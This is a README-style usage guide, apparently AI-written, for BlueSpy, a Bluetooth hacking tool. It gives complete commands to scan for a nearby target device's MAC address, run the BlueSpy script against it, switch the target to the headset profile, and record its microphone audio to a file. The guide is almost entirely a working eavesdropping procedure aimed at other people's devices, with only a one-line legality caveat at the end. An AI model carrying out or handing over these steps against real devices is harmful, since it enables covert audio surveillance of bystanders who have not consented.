

---

# 🔵 BlueSpy: Bluetooth Audio Surveillance Tool

**BlueSpy** is a Bluetooth hacking tool that allows you to capture audio from nearby Bluetooth devices.

---

## 📥 Git Cloning

First, clone the BlueSpy repository from GitHub:

```bash
git clone https://github.com/TarlogicSecurity/BlueSpy.git
cd BlueSpy
```

---

## 📡 Step 1: Start Bluetooth Control Interface

Launch the Bluetooth control tool:

```bash
bluetoothctl
```

Inside the `bluetoothctl` prompt:

```bash
scan on
```

- This will begin scanning for nearby Bluetooth devices.
- Identify and note the **MAC address** of your target device.

---

## 🐍 Step 2: Run BlueSpy Script

Run the BlueSpy Python script by providing the target device’s Bluetooth address:

```bash
python BlueSpy.py -a <address>
```

> 🔄 Replace `<address>` with the actual **MAC address** of your target device.

---

## 🎧 Step 3: Set Bluetooth Audio Profile

Activate the **headset-head-unit** profile for the target device:

```bash
pactl set-card-profile bluez_card.<address> headset-head-unit
```

> 🔄 Replace `<address>` with the **MAC address** of your target device.

---

## 🔴 Step 4: Record Audio Input

Start recording the audio stream from the target device:

```bash
parecord --device=bluez_input.<address> recording.wav
```

- This will capture and save the audio to a file named `recording.wav`.

---

## ⚠️ Important Notes

- Ensure your system has **Bluetooth** and **audio recording permissions** enabled.
- **pulseaudio** or **PipeWire** should be properly installed and configured for this to work smoothly.
- Always use this tool responsibly and ethically — unauthorized interception is illegal.

---

✅ That’s it!  
Let me know if you'd like to add author credits, license info, or extra tips to this `README.md` as well!